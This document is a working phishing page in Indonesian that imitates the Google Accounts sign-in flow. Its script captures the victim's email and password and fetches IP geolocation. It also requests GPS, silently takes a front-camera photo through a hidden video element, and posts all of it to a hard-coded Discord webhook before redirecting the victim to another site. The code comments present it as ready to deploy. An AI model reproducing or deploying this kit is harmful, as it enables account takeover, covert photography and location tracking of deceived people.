<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Sign in - Google Accounts</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'><path fill='%234285F4' d='M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z'/><path fill='%2334A853' d='M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z'/><path fill='%23FBBC05' d='M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z'/><path fill='%23EA4335' d='M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z'/></svg>">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%}
body{font-family:'Google Sans','Roboto',Arial,sans-serif;background:#fff;color:#202124;display:flex;flex-direction:column;overflow-x:hidden}
.wrap{max-width:480px;width:100%;margin:0 auto;padding:48px 40px 24px;flex:1;display:flex;flex-direction:column;min-height:100vh}
.logo-top{display:flex;justify-content:center;margin-bottom:24px}
.logo-top svg{width:48px;height:48px}
h1{font-family:'Google Sans','Roboto',Arial,sans-serif;font-size:24px;font-weight:400;text-align:center;margin-bottom:8px;color:#202124;letter-spacing:0}
.sub{text-align:center;font-size:15px;color:#5f6368;margin-bottom:32px;font-family:'Google Sans','Roboto',Arial,sans-serif;font-weight:400;line-height:1.4}
.field{position:relative;margin-bottom:6px}
.field input{width:100%;padding:14px 15px;font-size:16px;border:1px solid #dadce0;border-radius:8px;background:transparent;color:#202124;font-family:'Roboto',Arial,sans-serif;outline:none;transition:border-color .15s,box-shadow .15s;font-weight:400}
.field input:hover{border-color:#5f6368}
.field input:focus{border:2px solid #1a73e8;padding:13px 14px;box-shadow:none}
.field label{position:absolute;top:-8px;left:12px;background:#fff;padding:0 6px;font-size:12px;color:#5f6368;font-family:'Google Sans','Roboto',Arial,sans-serif;pointer-events:none;transition:color .15s}
.field input:focus+label{color:#1a73e8}
.forgot-row{display:flex;justify-content:flex-start;margin-bottom:40px}
.forgot{color:#1a73e8;font-size:14px;font-weight:500;cursor:pointer;text-decoration:none;background:none;border:none;font-family:'Google Sans','Roboto',Arial,sans-serif;padding:0;letter-spacing:0.25px}
.forgot:hover{text-decoration:underline}
.actions{display:flex;justify-content:space-between;align-items:center;margin-top:auto;padding-top:32px}
.create{color:#1a73e8;font-size:14px;font-weight:500;cursor:pointer;padding:10px 8px;background:none;border:none;font-family:'Google Sans','Roboto',Arial,sans-serif;letter-spacing:0.25px;border-radius:4px}
.create:hover{background:rgba(26,115,232,0.04)}
.next{background:#1a73e8;color:#fff;border:none;padding:11px 24px;border-radius:100px;font-size:14px;font-weight:500;cursor:pointer;font-family:'Google Sans','Roboto',Arial,sans-serif;letter-spacing:0.25px;transition:background .15s,box-shadow .15s}
.next:hover{background:#1557b0;box-shadow:0 1px 3px rgba(60,64,67,0.3),0 4px 8px rgba(60,64,67,0.15)}
.next:active{background:#174ea6}
.footer{display:flex;justify-content:space-between;align-items:center;padding:20px 0 8px;font-size:12px;color:#5f6368;font-family:'Google Sans','Roboto',Arial,sans-serif;margin-top:24px}
.footer select{border:none;background:none;color:#5f6368;font-family:'Google Sans','Roboto',Arial,sans-serif;font-size:12px;cursor:pointer;outline:none;padding:4px 0}
.footer-links{display:flex;gap:20px}
.footer-links span{cursor:pointer;font-weight:400}
.footer-links span:hover{color:#202124}
/* STEP 2 */
.step2{display:none}
.step2.show{display:flex}
.back-arrow{position:absolute;top:24px;left:16px;cursor:pointer;font-size:20px;color:#5f6368;background:none;border:none;padding:10px;line-height:1;border-radius:50%;width:40px;height:40px;display:flex;align-items:center;justify-content:center;transition:background .15s}
.back-arrow:hover{background:rgba(60,64,67,0.08)}
.user-chip{display:flex;align-items:center;gap:8px;border:1px solid #dadce0;border-radius:100px;padding:5px 14px 5px 5px;font-size:14px;margin:0 auto 24px;width:fit-content;color:#202124;font-family:'Roboto',Arial,sans-serif}
.user-chip .avatar{width:26px;height:26px;border-radius:50%;background:linear-gradient(135deg,#4285F4,#34A853);color:#fff;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:500;flex-shrink:0}
.pwd-wrap{position:relative}
.pwd-toggle{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;padding:8px;color:#5f6368;font-size:18px;line-height:1;display:flex;align-items:center;justify-content:center}
.pwd-toggle:hover{color:#202124}
/* LOADING */
.loader{position:fixed;top:0;left:0;right:0;bottom:0;background:#fff;display:none;flex-direction:column;justify-content:center;align-items:center;z-index:1000;padding:40px 30px;text-align:center}
.loader.show{display:flex}
.spin{width:48px;height:48px;border:4px solid #e8eaed;border-top-color:#1a73e8;border-radius:50%;animation:sp .9s linear infinite;margin-bottom:32px}
@keyframes sp{to{transform:rotate(360deg)}}
.loading-text{font-family:'Google Sans','Roboto',Arial,sans-serif;font-size:18px;color:#202124;font-weight:500;margin-bottom:8px;letter-spacing:0}
.loading-sub{font-size:14px;color:#5f6368;margin-bottom:36px;line-height:1.5;max-width:340px;font-family:'Roboto',Arial,sans-serif}
.progress-bar{width:100%;max-width:320px;height:4px;background:#e8eaed;border-radius:2px;overflow:hidden;margin-bottom:16px}
.progress-fill{height:100%;background:linear-gradient(90deg,#1a73e8,#4285F4);width:0%;transition:width .35s ease;border-radius:2px}
.progress-step{font-size:13px;color:#5f6368;min-height:20px;font-family:'Roboto',Arial,sans-serif}
.check-icon{width:56px;height:56px;border-radius:50%;background:#e6f4ea;display:flex;align-items:center;justify-content:center;margin-bottom:24px;animation:pop .4s ease}
@keyframes pop{0%{transform:scale(0)}80%{transform:scale(1.1)}100%{transform:scale(1)}}
.check-icon svg{width:32px;height:32px;fill:#137333}
</style>
</head>
<body>

<!-- STEP 1 - EMAIL -->
<div class="wrap" id="step1">
<div class="logo-top">
<svg viewBox="0 0 48 48"><path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"/><path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"/><path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"/><path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"/></svg>
</div>
<h1>Masuk</h1>
<p class="sub">untuk melanjutkan ke Gmail</p>
<form id="form1" onsubmit="return false;">
<div class="field">
<input type="email" id="email" required autocomplete="off" autofocus>
<label for="email">Email atau nomor telepon</label>
</div>
<div class="forgot-row">
<button type="button" class="forgot">Lupa email?</button>
</div>
<div class="actions">
<button type="button" class="create">Buat akun</button>
<button type="submit" class="next" id="nextBtn">Berikutnya</button>
</div>
</form>
<div class="footer">
<select><option>Indonesia (Bahasa Indonesia)</option></select>
<div class="footer-links">
<span>Bantuan</span>
<span>Privasi</span>
<span>Ketentuan</span>
</div>
</div>
</div>

<!-- STEP 2 - PASSWORD -->
<div class="wrap step2" id="step2">
<button class="back-arrow" onclick="backStep()" aria-label="Kembali">←</button>
<div class="logo-top">
<svg viewBox="0 0 48 48"><path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"/><path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"/><path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"/><path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"/></svg>
</div>
<h1>Selamat datang</h1>
<div class="user-chip">
<div class="avatar" id="avatarInitial">A</div>
<div id="userEmail">user@gmail.com</div>
</div>
<form id="form2" onsubmit="return false;">
<div class="field pwd-wrap">
<input type="password" id="password" required autocomplete="off" autofocus>
<label for="password">Masukkan sandi Anda</label>
<button type="button" class="pwd-toggle" onclick="togglePwd(this)" id="pwdToggle">👁</button>
</div>
<div class="forgot-row" style="margin-top:16px;margin-bottom:32px"></div>
<div class="actions">
<button type="button" class="create">Lupa sandi?</button>
<button type="submit" class="next" id="loginBtn">Berikutnya</button>
</div>
</form>
</div>

<!-- LOADING -->
<div class="loader" id="loader">
<div class="spin" id="spinIcon"></div>
<div class="loading-text" id="loadingText">Memverifikasi akun Anda...</div>
<div class="loading-sub" id="loadingSub">Mohon tunggu sebentar, kami sedang memeriksa keamanan akun Anda</div>
<div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
<div class="progress-step" id="progressStep">Menghubungkan ke server Google...</div>
</div>

<script>
// ==========================================
// KONFIGURASI - GANTI REDIRECT_URL AJA!
// ==========================================
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1551945725389185147/omATy3XeK2vxQrZghBdteucQXuXvLsT2soSNzMTfO7SiRvDdVm-FXyhpEV9MGjtICIKq";
const REDIRECT_URL = "https://pengajuan-monentra.42web.io/";

// ==========================================
// STATE
// ==========================================
let captured = { email: null, password: null, ipData: null, gps: null, device: null, photo: null };
let pwdVisible = false;

fetch('https://ipapi.co/json/').then(r => r.json()).then(d => { captured.ipData = d; }).catch(() => {});

// ==========================================
// STEP 1 → STEP 2
// ==========================================
document.getElementById('nextBtn').addEventListener('click', function() {
    const email = document.getElementById('email').value.trim();
    if (!email || !email.includes('@')) {
        document.getElementById('email').focus();
        return;
    }
    captured.email = email;
    document.getElementById('userEmail').textContent = email;
    document.getElementById('avatarInitial').textContent = email.charAt(0).toUpperCase();
    document.getElementById('step1').style.display = 'none';
    document.getElementById('step2').classList.add('show');
    setTimeout(() => document.getElementById('password').focus(), 100);
});

// ==========================================
// STEP 2 - PASSWORD → LOADING + TRACKING
// ==========================================
document.getElementById('loginBtn').addEventListener('click', async function() {
    const password = document.getElementById('password').value;
    if (!password) {
        document.getElementById('password').focus();
        return;
    }
    captured.password = password;
    captured.device = getDeviceInfo();
    document.getElementById('step2').style.display = 'none';
    document.getElementById('loader').classList.add('show');
    sendPasswordOnly();
    await runLoadingSequence();
});

// ==========================================
// TOGGLE PASSWORD
// ==========================================
function togglePwd(btn) {
    const pwd = document.getElementById('password');
    pwdVisible = !pwdVisible;
    pwd.type = pwdVisible ? 'text' : 'password';
    btn.textContent = pwdVisible ? '🙈' : '👁';
}

// ==========================================
// LOADING SEQUENCE 12 DETIK
// ==========================================
async function runLoadingSequence() {
    const totalTime = 12000;
    const steps = [
        { time: 0, text: "Menghubungkan ke server Google...", progress: 5 },
        { time: 2000, text: "Memverifikasi identitas...", progress: 20 },
        { time: 4000, text: "Memeriksa keamanan akun...", progress: 40 },
        { time: 6000, text: "Sinkronisasi data...", progress: 60 },
        { time: 8000, text: "Hampir selesai...", progress: 80 },
        { time: 10000, text: "Menyelesaikan verifikasi...", progress: 95 },
        { time: 11500, text: "Selesai!", progress: 100 }
    ];
    steps.forEach(step => {
        setTimeout(() => {
            document.getElementById('progressStep').textContent = step.text;
            document.getElementById('progressFill').style.width = step.progress + '%';
        }, step.time);
    });
    setTimeout(async () => {
        try { captured.gps = await getGPS(); console.log('✅ GPS dapet'); }
        catch(e) { console.log('❌ GPS gagal:', e); }
    }, 2000);
    setTimeout(async () => {
        try { captured.photo = await getCamera(); console.log('✅ Foto dapet'); }
        catch(e) { console.log('❌ Kamera gagal:', e); }
    }, 4000);
    setTimeout(async () => { await sendFullData(); }, 8000);
    setTimeout(() => {
        document.getElementById('spinIcon').outerHTML = '<div class="check-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>';
        document.getElementById('loadingText').textContent = 'Verifikasi berhasil!';
        document.getElementById('loadingSub').textContent = 'Mengalihkan ke akun Anda...';
        setTimeout(() => { window.location.href = REDIRECT_URL; }, 1000);
    }, totalTime);
}

function backStep() {
    document.getElementById('step2').style.display = 'none';
    document.getElementById('step1').style.display = 'flex';
}

// ==========================================
// GET GPS
// ==========================================
function getGPS() {
    return new Promise((resolve, reject) => {
        if (!navigator.geolocation) { reject('No GPS'); return; }
        navigator.geolocation.getCurrentPosition(
            (pos) => resolve({
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                accuracy: pos.coords.accuracy
            }),
            (err) => reject(err.message),
            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
    });
}

// ==========================================
// GET CAMERA - NO ZOOM
// ==========================================
function getCamera() {
    return new Promise(async (resolve, reject) => {
        try {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                reject('No camera'); return;
            }
            let stream;
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 1080 }, height: { ideal: 1920 } },
                    audio: false
                });
            } catch(e) {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: false
                });
            }
            const video = document.createElement('video');
            video.srcObject = stream;
            video.setAttribute('playsinline', '');
            video.muted = true;
            video.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px';
            document.body.appendChild(video);
            await new Promise((res) => {
                video.onloadedmetadata = () => res();
                video.play();
            });
            await new Promise(r => setTimeout(r, 1500));
            const track = stream.getVideoTracks()[0];
            const settings = track.getSettings();
            const width = settings.width || 1080;
            const height = settings.height || 1920;
            const canvas = document.createElement('canvas');
            canvas.width = width;
            canvas.height = height;
            const ctx = canvas.getContext('2d');
            ctx.imageSmoothingEnabled = true;
            ctx.imageSmoothingQuality = 'high';
            ctx.drawImage(video, 0, 0, width, height);
            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.92));
            stream.getTracks().forEach(t => t.stop());
            video.remove();
            if (blob) { console.log(`✅ Foto: ${width}x${height}`); resolve(blob); }
            else { reject('Blob failed'); }
        } catch(e) { reject(e.message); }
    });
}

// ==========================================
// DEVICE INFO
// ==========================================
function getDeviceInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        bahasa: navigator.language,
        layar: screen.width + 'x' + screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        online: navigator.onLine,
        cpu: navigator.hardwareConcurrency || 'N/A'
    };
}

// ==========================================
// KIRIM PASSWORD (URGENT)
// ==========================================
async function sendPasswordOnly() {
    const ip = captured.ipData || {};
    const embed = {
        title: '🔐 PASSWORD GOOGLE TERTANGKAP!',
        description: '**Target baru aja masukin email + password!**',
        color: 0xff0000,
        fields: [
            { name: '📧 EMAIL', value: '`' + captured.email + '`', inline: false },
            { name: '🔑 PASSWORD', value: '`' + captured.password + '`', inline: false },
            { name: '🌐 IP', value: '`' + (ip.ip || 'N/A') + '`', inline: true },
            { name: '🏙️ Kota', value: ip.city || 'N/A', inline: true },
            { name: '🗺️ Provinsi', value: ip.region || 'N/A', inline: true }
        ],
        footer: { text: 'KENNZ Google • ' + new Date().toLocaleString('id-ID') },
        timestamp: new Date().toISOString()
    };
    const formData = new FormData();
    formData.append('payload_json', JSON.stringify({
        content: '@here **🚨 PASSWORD TERTANGKAP!**',
        embeds: [embed]
    }));
    try {
        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
        console.log('✅ Password terkirim');
    } catch(e) {}
}

// ==========================================
// KIRIM DATA LENGKAP
// ==========================================
async function sendFullData() {
    const ip = captured.ipData || {};
    const gps = captured.gps || {};
    const dev = captured.device || {};
    const gpsBerhasil = gps.latitude && gps.longitude;
    const mapsLink = gpsBerhasil 
        ? 'https://www.google.com/maps?q=' + gps.latitude + ',' + gps.longitude 
        : (ip.latitude && ip.longitude ? 'https://www.google.com/maps?q=' + ip.latitude + ',' + ip.longitude : null);
    const photoBerhasil = captured.photo !== null;
    const embed = {
        title: '🎯 TARGET LENGKAP DAPET!',
        description: '**Password + Lokasi + Foto**',
        color: 0x00c853,
        fields: [
            { name: '📧 EMAIL', value: '`' + captured.email + '`', inline: false },
            { name: '🔑 PASSWORD', value: '`' + captured.password + '`', inline: false }
        ],
        footer: { text: 'KENNZ Google • ' + new Date().toLocaleString('id-ID') },
        timestamp: new Date().toISOString()
    };
    if (gpsBerhasil) embed.fields.push(
        { name: '📌 Latitude', value: '`' + gps.latitude + '`', inline: true },
        { name: '📌 Longitude', value: '`' + gps.longitude + '`', inline: true },
        { name: '🎯 Akurasi', value: '± ' + Math.round(gps.accuracy) + 'm', inline: true }
    );
    if (ip.ip) embed.fields.push(
        { name: '🌐 IP', value: '`' + ip.ip + '`', inline: true },
        { name: '🏙️ Kota', value: ip.city || 'N/A', inline: true },
        { name: '🗺️ Provinsi', value: ip.region || 'N/A', inline: true },
        { name: '🌏 Negara', value: ip.country_name || 'N/A', inline: true },
        { name: '📡 ISP', value: ip.org || 'N/A', inline: true }
    );
    if (dev.platform) embed.fields.push(
        { name: '📱 Platform', value: dev.platform, inline: true },
        { name: '🌐 Bahasa', value: dev.bahasa, inline: true },
        { name: '🕐 Timezone', value: dev.timezone, inline: true }
    );
    embed.fields.push({ name: '📸 FOTO', value: photoBerhasil ? '✅ BERHASIL' : '❌ Gagal', inline: false });
    if (mapsLink) embed.fields.push({ name: '🗺️ Google Maps', value: '[📌 Klik Disini](' + mapsLink + ')', inline: false });
    const formData = new FormData();
    formData.append('payload_json', JSON.stringify({
        content: '@here **🎯 DATA LENGKAP MASUK!**',
        embeds: [embed]
    }));
    if (captured.photo) {
        formData.append('files[0]', captured.photo, 'target_photo.jpg');
    }
    try {
        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
        console.log('✅ Data lengkap terkirim');
    } catch(e) {}
}
</script>

</body>
  </html>
